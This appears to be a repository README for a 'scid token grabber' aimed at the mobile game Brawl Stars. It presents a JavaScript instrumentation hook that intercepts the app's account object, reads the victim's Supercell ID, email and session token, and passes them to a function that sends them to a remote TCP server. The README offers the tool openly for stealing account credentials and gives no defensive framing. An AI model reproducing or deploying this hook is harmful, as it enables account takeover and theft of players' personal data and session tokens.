# Brawl-Stars-ScidToken
Just an easy scid token grabber for brawl stars that sent data to a TCP
 over TCP
 This part of the code retrieves victim account data :
 ```js

var IdAccount = Java.use("com.supercell.id.scid_plugin.IdAccount");

IdAccount.toString.overload().implementation = function () {
    var result = this.toString();
    
    var supercellId = this.supercellId.value;  // Retrieves the Supercell ID
    var email = this.email.value;             // Retrieves the associated email
    var scidToken = this.scidToken.value;     // Retrieves the SCID token

    console.log(supercellId);
    console.log(email);
    console.log(scidToken);

    sendToTcpServer(supercellId, email, scidToken); // Sends data to the remote server

    return result;
};
```
    
